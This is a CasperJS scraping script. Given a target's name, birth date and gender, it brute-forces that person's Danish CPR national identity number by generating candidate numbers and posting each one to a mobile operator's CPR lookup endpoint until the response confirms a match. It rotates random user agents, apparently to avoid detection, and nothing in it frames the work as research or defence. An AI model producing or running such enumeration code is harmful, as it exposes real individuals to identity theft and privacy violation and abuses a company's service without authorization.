var casper = require('casper').create({
  pageSettings: {
    loadImages:  false,        // do not load images
    loadPlugins: false         // do not load NPAPI plugins (Flash, Silverlight, ...)
  },
  verbose: false,
  // logLevel: "debug",
  waitTimeout: 10000
});

/***** include scrapeUtils utilities *********************/

var colorizer = require('colorizer').create('Colorizer');
var generateCpr = require('./generateCpr.js').generateCpr;
var generateLastNames = require('./generateLastNames.js');
var helpers = require('./helpers.js').helpers(casper);
var cprList = [];

/***** command line options/arguments ********************/

var cliOptions = casper.cli.options;

var person = {
    firstName: decodeURI(cliOptions.firstName).replace(/\+/g, " "),
    lastName: decodeURI(cliOptions.lastName).replace(/\+/g, " "),
    dob: helpers.zeroPad(cliOptions.dob, 6),
    gender: cliOptions.gender,
    lastNames: []
};

var startFrom = cliOptions.startFrom || 0;


/**************************************************/

// begin
casper.start();

casper.then(function(){
  // generate list of cpr numbers
  cprList = generateCpr.init(person.dob, person.gender);

  // generate full names with different combinations
  person.lastNames = generateLastNames.init(person.lastName);

  console.log(person.firstName);
  console.log(person.lastName);
  console.log(person.dob);
  console.log(person.gender);
  console.log("Starting from " + cprList[startFrom]);

  // Set viewport size
  this.viewport(1024, 768);

  // set random user agent
  this.userAgent(helpers.getRandomUserAgent());
});

/**************************************************/


casper.then(function(){
  checkCpr(0);
});

var checkCpr = function(index){

  var cpr = person.dob + cprList[index];
  var fullName = person.firstName + " " + person.lastNames[index];
  var data = {
    cpr: cpr,
    name: fullName,
    checkDebt: true
  };

  // console.log(JSON.stringify(data));

  // request
  casper.thenOpen('https://www.ok-mobil.dk/tilmeld/ok-3-timers-pakke/cpr-opslag', {
    method: 'post',
    data: data
  });

  // response
  casper.then(function() {
    var response = JSON.parse(this.getPageContent());

    // success
    if(response.Message === null){
      console.log("correct: " + cpr);
    // error
    }else{

      // console.log("Debug: " + response.Message);
      console.log("wrong: " + cpr);
      index++;
      if(cprList[index] !== undefined){
        checkCpr(index);
      }
    }
  });
};

casper.run(function() {
    console.log("Finished");
    this.exit();
});